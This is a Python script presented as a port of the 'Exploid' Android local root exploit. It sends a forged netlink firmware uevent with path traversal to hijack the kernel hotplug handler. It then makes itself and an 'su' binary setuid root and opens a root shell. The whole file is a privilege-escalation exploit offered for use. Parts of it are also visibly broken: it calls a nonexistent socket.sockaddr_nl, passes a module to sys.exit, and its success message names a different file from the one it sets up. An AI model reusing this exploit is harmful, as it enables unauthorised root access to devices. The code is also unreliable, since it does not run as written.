import os
import socket
import sys
import errno
import stat
import subprocess
import time

def die(msg):
    print(msg)
    sys.exit(errno)

def clear_hotplug():
    try:
        with open("/proc/sys/kernel/hotplug", "w") as f:
            f.write("")
    except Exception as e:
        die(f"Error clearing hotplug: {e}")

def rootshell():
    try:
        os.setuid(0)
        os.setgid(0)
        subprocess.call(["/system/bin/sh"])
    except Exception as e:
        die(f"[-] execve error: {e}")

def main():
    buf = bytearray(512)
    path = bytearray(512)
    sock = None
    basedir = None

    # Checking if we already have root access
    if os.geteuid() == 0 and os.getuid() != 0:
        rootshell()

    try:
        readlink = os.readlink("/proc/self/exe")
        path[:len(readlink)] = readlink.encode('utf-8')
    except Exception as e:
        die(f"[-] readlink error: {e}")

    if os.geteuid() == 0:
        clear_hotplug()

        # Chown and chmod
        os.chown(path.decode('utf-8'), 0, 0)
        os.chmod(path.decode('utf-8'), 0o4711)

        os.chown("/sqlite_stmt_journals/su", 0, 0)
        os.chmod("/sqlite_stmt_journals/su", 0o6755)

        return 0

    print("[*] Android local root exploit (C) The Android Exploid Crew")
    print("[*] Modified by Martin Paul Eve for Wildfire Stage 1 soft-root")

    basedir = "/sqlite_stmt_journals"
    if not os.path.isdir(basedir):
        basedir = "/data/local/tmp"
        if not os.path.isdir(basedir):
            basedir = os.getcwd()

    print(f"[+] Using basedir={basedir}, path={path.decode('utf-8')}")
    print("[+] Opening NETLINK_KOBJECT_UEVENT socket")

    try:
        sock = socket.socket(socket.AF_NETLINK, socket.SOCK_DGRAM, socket.NETLINK_KOBJECT_UEVENT)
        snl = socket.sockaddr_nl()
        snl.nl_pid = 1
        snl.nl_family = socket.AF_NETLINK
        sock.connect((snl, socket.NETLINK_KOBJECT_UEVENT))
    except Exception as e:
        die(f"[-] Socket error: {e}")

    try:
        # Create the files and symlink as per the exploit logic
        open("loading", "w").close()
        with open("hotplug", "w") as f:
            f.write(path.decode('utf-8'))
        os.symlink("/proc/sys/kernel/hotplug", "data")
        
        msg = f"ACTION=add\x00DEVPATH=/..{basedir}\x00SUBSYSTEM=firmware\x00FIRMWARE=../../..{basedir}/hotplug\x00"
        sock.send(msg.encode('utf-8'))
    except Exception as e:
        die(f"[-] File/Socket error: {e}")
    finally:
        sock.close()

    print("[*] Try to invoke hotplug now, clicking on the wireless settings, plugin USB key etc.")
    print("[*] You succeeded if you find /system/bin/rootshell.")
    print("[*] GUI might hang/restart meanwhile so be patient.")
    return 0

if __name__ == "__main__":
    main()